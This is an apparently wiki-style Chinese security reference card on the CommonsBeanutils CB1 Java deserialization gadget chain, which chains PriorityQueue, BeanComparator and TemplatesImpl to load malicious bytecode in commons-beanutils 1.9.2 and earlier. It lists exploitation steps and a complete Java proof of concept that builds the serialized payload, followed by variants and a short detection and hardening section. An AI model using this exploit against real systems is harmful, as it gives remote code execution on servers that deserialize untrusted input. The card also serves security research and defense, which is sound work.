---
id: web-java-deser-commonsbeanutils-cb1-beancomparator-priorityqueue
title: CB1 CommonsBeanutils BeanComparator + PriorityQueue 触发 TemplatesImpl
type: scenario
domain: web
path: web/java/deserialization/comparator
technique: cb1-beancomparator-priorityqueue-templatesimpl
tags:
- java
- deserialization
- gadget
- commons-beanutils
- cb1
- beancomparator
- priorityqueue
- templatesimpl
cve: []
severity: high
confidence: high
status: verified
affected_versions: commons-beanutils <= 1.9.2（原文）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:09:16+08:00'
  notes: 已对照原文核对：BeanComparator.compare→PropertyUtils.getProperty(o,outputProperties)→TemplatesImpl.getOutputProperties→newTransformer→defineTransletClasses、PriorityQueue size=2 与 queue={templates,null}、commons-beanutils<=1.9.2 均与原文一致；补充边界：无参 BeanComparator 默认 comparator 为 commons-collections 3.x 的 ComparableComparator，目标 classpath 需有该类（beanutils 的传递依赖），卡片“不依赖 Commons Collections”应理解为不依赖 CC gadget 而非完全无 CC 类
url: /docs/web/java/deserialization/comparator/web-java-deser-commonsbeanutils-cb1-beancomparator-priorityqueue/
draft: false
kb_aliases:
- CB1
- CommonsBeanutils 链
- BeanComparator 链
- PropertyUtils getProperty
- PriorityQueue BeanComparator
---

## 一句话结论

在 commons-beanutils <= 1.9.2 环境中，`PriorityQueue.readObject()` 重建堆时调用 `BeanComparator.compare()`，后者用 `PropertyUtils.getProperty(o, "outputProperties")` 反射调用 `TemplatesImpl.getOutputProperties()`，进而进入 `newTransformer()` 加载恶意字节码，实现不依赖 Commons Collections 的反序列化 RCE。

## 原理

- `BeanComparator.compare(o1, o2)` 在 `property` 非空时，对两个参数分别调用 `PropertyUtils.getProperty(o, property)`，再比较返回值；`PropertyUtils.getProperty` 会根据属性名反射调用对应的 getter。
- 把 `property` 设为 `"outputProperties"`，把队列元素设为 `TemplatesImpl` 实例，`getProperty` 就会调用 `TemplatesImpl.getOutputProperties()`。
- `TemplatesImpl.getOutputProperties()` 内部执行 `newTransformer().getOutputProperties()`；`newTransformer()` → `getTransletInstance()` → `defineTransletClasses()` → 加载 `_bytecodes` 中的恶意类并执行静态初始化。
- `PriorityQueue.readObject()` 读取元素后调用 `heapify()`，`heapify()` → `siftDown()` → `siftDownUsingComparator()` → `comparator.compare(...)`。因此 `BeanComparator` 被放入 `PriorityQueue` 作为 comparator 即可在反序列化时自动触发。
- 需要 `PriorityQueue.size >= 2` 才会进入 `siftDown` 循环；原文通过反射直接设置 `size=2`，并把 `queue` 设为 `{templates, null}`，使 compare 的第一个参数是恶意 `TemplatesImpl`。
- 与 CB1 相关的“无 Commons Collections”特点：只依赖 commons-beanutils 与 JDK 内部 Xalan，绕过了对 CC 版本的依赖。

## 触发条件

- commons-beanutils <= 1.9.2（`BeanComparator` 可序列化且未做安全限制）。
- 目标 JDK 可访问内部 Xalan `TemplatesImpl`（JDK 8；JDK 17+ 模块封装后需外部 Xalan 或其它 sink）。
- 存在 Java 原生反序列化入口，未过滤 `PriorityQueue`、`BeanComparator`、`TemplatesImpl`。
- 攻击侧能生成继承 `AbstractTranslet` 的恶意字节码。

## 利用步骤

1. 生成继承 `AbstractTranslet` 的恶意类，静态块执行命令，取字节码。
2. 构造 `TemplatesImpl`，反射设置 `_name`、`_bytecodes`、`_tfactory`。
3. `new BeanComparator()`，反射把 `property` 设为 `"outputProperties"`。
4. 用该 comparator 构造 `PriorityQueue`，反射设置 `size=2`、`queue={templates, null}`。
5. 序列化 `PriorityQueue` 并发送到目标反序列化入口。

## PoC

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB1 {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("Evil.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name", "test");
        setField(templates, "_bytecodes", new byte[][]{code});
        setField(templates, "_tfactory", new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator();
        PriorityQueue<Object> queue = new PriorityQueue<>(comparator);

        setField(comparator, "property", "outputProperties");
        setField(queue, "size", 2);
        setField(queue, "queue", new Object[]{templates, null});

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(queue);
        }
    }

    static void setField(Object o, String name, Object v) throws Exception {
        Field f = o.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(o, v);
    }
}
```

```text
# 链：
# PriorityQueue.readObject()
#   -> heapify()
#     -> siftDown()
#       -> siftDownUsingComparator()
#         -> BeanComparator.compare()
#           -> PropertyUtils.getProperty(templates, "outputProperties")
#             -> TemplatesImpl.getOutputProperties()
#               -> newTransformer()
#                 -> defineTransletClasses() -> 恶意字节码
```

## 变体与关联

- 变体：JDK 17+ 内部 Xalan 被强封装时，改用外部 `xalan:xalan` 的 `org.apache.xalan.xsltc.trax.TemplatesImpl`（见外部 Xalan 卡片）。
- 变体：`BeanComparator` 的 property 可换成其它有危险 getter 的属性；也可搭配其它 comparator 触发点（TreeMap/TreeSet）。
- 变体：CB1 也可与 CC4 的 `PriorityQueue` 触发结构互换，区别只在 comparator 与 sink。
- 关联：[[web-java-deserialization-external-xalan-templatesimpl-sink]]（JDK 21 外部 Xalan 的 CB1 变体）；[[web-java-deser-commonscollections-cc4-priorityqueue-templatesimpl]]（PriorityQueue + TransformingComparator + TemplatesImpl）；[[web-java-deser-comparator-priorityqueue]]（PriorityQueue 比较器通用构造）。
- 边界：commons-beanutils 版本高于 1.9.2 时 `BeanComparator` 的行为/可用性可能变化；JDK 17+ 内部 Xalan 不可反射访问；JEP 290 过滤 `PriorityQueue`/`TemplatesImpl` 时失效。

## 检测与防御

- 检测：序列化流中出现 `PriorityQueue` + `BeanComparator` + `TemplatesImpl`；反序列化后 `PropertyUtils.getProperty` 被调用、加载未知类或执行 `Runtime.exec`。
- 修复：升级 commons-beanutils 到安全版本；消除不可信 Java 原生反序列化。
- 加固：JEP 290 `ObjectInputFilter` 白名单，拒绝 `BeanComparator`、`TemplatesImpl` 等非业务类；升级 JDK 并限制内部 Xalan 访问。
